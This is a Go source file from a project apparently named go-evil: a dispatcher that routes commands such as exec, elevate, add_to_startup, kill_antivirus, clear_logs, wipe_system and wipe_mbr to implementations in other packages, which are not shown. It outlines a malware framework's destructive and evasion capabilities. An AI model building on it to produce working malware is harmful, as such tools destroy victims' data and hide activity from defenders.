package system

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/domains/system/antivirus"
	"github.com/s9rA16Bf4/go-evil/domains/system/directories"
	"github.com/s9rA16Bf4/go-evil/domains/system/disks"
	"github.com/s9rA16Bf4/go-evil/domains/system/io"
	"github.com/s9rA16Bf4/go-evil/domains/system/logs"
	"github.com/s9rA16Bf4/go-evil/domains/system/processes"
	"github.com/s9rA16Bf4/go-evil/domains/system/startup"
	"github.com/s9rA16Bf4/go-evil/domains/system/stop"
	systemcommands "github.com/s9rA16Bf4/go-evil/domains/system/system_commands"
	"github.com/s9rA16Bf4/go-evil/domains/system/users"
	"github.com/s9rA16Bf4/go-evil/domains/system/wipe"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func Parser(function string, value string, data_object *json.Json_t) []string {
	call := []string{}

	switch function {
	case "out":
		call = io.Out(value, data_object)

	case "outln":
		call = io.Outln(value, data_object)

	case "in":
		call = io.Input(data_object)

	case "exit":
		call = stop.Exit(value, data_object)

	case "exec":
		call = systemcommands.Exec(value, data_object)

	case "abort":
		call = stop.Abort(value, data_object)

	case "reboot":
		call = systemcommands.Reboot(data_object)

	case "shutdown":
		call = systemcommands.Shutdown(data_object)

	case "add_to_startup":
		call = startup.Add(data_object)

	case "list_dir":
		call = directories.List(value, data_object)

	case "write":
		call = io.Write(value, data_object)

	case "read":
		call = io.Read(value, data_object)

	case "remove":
		call = io.Remove(value, data_object)

	case "move":
		call = io.Move(value, data_object)

	case "copy":
		call = io.Copy(value, data_object)

	case "change_background":
		call = systemcommands.Change_background(value, data_object)

	case "elevate":
		call = systemcommands.Elevate(value, data_object)

	case "create_user":
		call = users.Create(value, data_object)

	case "kill_process_id":
		call = processes.Kill_id(value, data_object)

	case "kill_process_name":
		call = processes.Kill_name(value, data_object)

	case "kill_antivirus":
		call = antivirus.Kill(value, data_object)

	case "clear_logs":
		call = logs.Clear(value, data_object)

	case "wipe_system":
		call = wipe.System(value, data_object)

	case "wipe_mbr":
		call = wipe.Mbr(value, data_object)

	case "get_disks":
		call = disks.Get(value, data_object)

	case "get_users":
		call = users.Get(value, data_object)

	case "get_processes":
		call = processes.Get(value, data_object)

	case "get_processes_name":
		call = processes.Get_names(value, data_object)

	case "get_processes_pid":
		call = processes.Get_pids(value, data_object)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "system.Parser()")

	}

	return call
}
